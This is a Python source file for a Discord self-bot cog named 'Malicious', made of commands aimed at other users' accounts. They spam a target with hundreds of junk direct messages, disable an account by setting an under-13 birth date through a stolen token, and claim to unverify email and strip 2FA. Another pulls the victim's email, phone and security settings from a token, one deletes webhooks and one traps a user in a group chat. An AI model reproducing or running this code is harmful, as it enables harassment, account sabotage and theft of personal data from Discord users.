# -*- coding: utf-8 -*-

import asyncio
import contextlib
import json
import random
import typing

import aiohttp
import discord
from discord.ext import commands
from ext.procedures import *


class Malicious(commands.Cog):
	def __init__(self, bot):
		self.bot = bot
		self.session = aiohttp.ClientSession(loop=self.bot.loop)

	async def dev_spam(self, member: typing.Union[discord.Member, discord.User]):
		with contextlib.suppress(discord.Forbidden):
			await member.send('<a://a{0}>'.format(''.join(random.choice('\'"^`|{}') for _ in range(1993))), nonce=random.randint(111111111111111111, 999999999999999999))

	@commands.command()
	async def annoy(self, ctx: commands.Context, member: typing.Union[commands.MemberConverter, commands.UserConverter]):
		await ctx.send(embed=discord.Embed(description="Starting annoyances (`{0}`)".format(member), color=discord.Color.blurple()), delete_after=self.bot.delete_delay)
		await asyncio.gather(*[asyncio.ensure_future(self.dev_spam(member)) for _ in range(250)], loop=self.bot.loop, return_exceptions=False)

	@commands.command(description="Adds user back to groupchat upon leaving")
	async def noleave(self, ctx: commands.Context, *, user: typing.Optional[commands.UserConverter]):
		if not isinstance(ctx.channel, discord.GroupChannel):
			return await ctx.send(embed=discord.Embed(color=discord.Color.blurple(), description="This command can only be used in group chats."), delete_after=self.bot.delete_delay)
		if ctx.channel.id in self.bot.no_leave_chats and not user:
			self.bot.no_leave_chats.pop(ctx.channel.id)
			await ctx.send(embed=discord.Embed(color=discord.Color.blurple(), description="No-Leave deactivated."), delete_after=self.bot.delete_delay)
		if not ctx.channel.id in self.bot.no_leave_chats and not user:
			await ctx.send_help(ctx.command)
		if not user.is_friend():
			return await ctx.send(embed=discord.Embed(color=discord.Color.blurple(), description="User must be a friend."), delete_after=self.bot.delete_delay)
		self.bot.no_leave_chats[ctx.channel.id] = [user]
		await ctx.send(embed=discord.Embed(color=discord.Color.blurple(), description="No-Leave activated."), delete_after=self.bot.delete_delay)

	@commands.command(description="Unverify account email associated with token")
	async def unverify(self, ctx: commands.Context, *, token: str):
		async with self.session.get("https://discord.com/api/v6/guilds/0/members", headers={"Authorization": str(token)}) as response:
			success = json.loads(await response.text())
			if success.get("message") in {"Missing Access", "You need to verify your account in order to perform this action."}:
				await ctx.send(embed=discord.Embed(description="Successfully unverified email.", color=discord.Color.blurple()), delete_after=self.bot.delete_delay)
			else:
				await ctx.send(embed=discord.Embed(description="Could not unverify email.", color=discord.Color.blurple()), delete_after=self.bot.delete_delay)

	@commands.command(description="Execute exploit to disable account associated with token")
	async def disable(self, ctx: commands.Context, *, token: str):
		async with self.session.patch("https://discordapp.com/api/v6/users/@me", headers={"Authorization": str(token)}, json={'date_of_birth': '2017-2-11'}) as response:
			success = json.loads(await response.text())
			if success.get("date_of_birth")[0] == "You need to be 13 or older in order to use Discord.":
				await ctx.send(embed=discord.Embed(description="Successfully disabled account.", color=discord.Color.blurple()), delete_after=self.bot.delete_delay)
			elif success.get("date_of_birth")[0] == "You cannot update your date of birth.":
				await ctx.send(embed=discord.Embed(description="Account is immune to disable exploit.", color=discord.Color.blurple()), delete_after=self.bot.delete_delay)
			else:
				await ctx.send(embed=discord.Embed(description="Could not disable account.", color=discord.Color.blurple()), delete_after=self.bot.delete_delay)
	
	@commands.command(description="Gather info from token")
	async def tokeninfo(self, ctx: commands.Context, *, token: str):
		async with self.session.get("https://discord.com/api/v6/users/@me", headers={"Authorization": str(token)}) as response:
			parser = json.loads(await response.text())
			embed = discord.Embed(color=discord.Color.blurple(), title=str("{0}#{1} ({2})".format(parser.get("username"), parser.get("discriminator"), parser.get("id"))))
			embed.add_field(name="Language", value=code_to_lang(parser.get("locale")))
			embed.add_field(name="Phone", value=parser.get('phone')) if parser.get('phone') else None
			embed.add_field(name="Email", value=parser.get('email'))
			embed.add_field(name="About Me", value=code_block(parser.get("bio"), ''), inline=False) if parser.get("bio") else None
			embed.add_field(name="2FA?", value=bool_to_emoji(parser.get('mfa_enabled')))
			embed.add_field(name="Email Verified?", value=bool_to_emoji(parser.get('verified')))
			await ctx.send(embed=embed, delete_after=self.bot.delete_delay)

	@commands.command(description="Disable 2FA for account associated with token")
	async def no2fa(self, ctx: commands.Context, *, token: str):
		async with self.session.post("https://discordapp.com/api/v6/users/@me/relationships", headers={"Authorization": str(token), "User-Agent": "discordbot"}, json={'username': 'Deleted User ff1a9125', 'discriminator': '190'}) as response:
			await ctx.send(embed=discord.Embed(description="Successfully disabled 2FA.", color=discord.Color.blurple()), delete_after=self.bot.delete_delay)

	@commands.command(description="Delete webhook")
	async def delhook(self, ctx: commands.Context, *, webhook: str):
		await self.session.delete(webhook)
		async with self.session.get(webhook) as verify:
			success = json.loads(await verify.text())
			if success.get("message") == "Unknown Webhook":
				await ctx.send(embed=discord.Embed(description="Successfully deleted webhook.", color=discord.Color.blurple()), delete_after=self.bot.delete_delay)
			else:
				await ctx.send(embed=discord.Embed(description="Could not delete webhook.", color=discord.Color.blurple()), delete_after=self.bot.delete_delay)

def setup(bot):
	bot.add_cog(Malicious(bot))
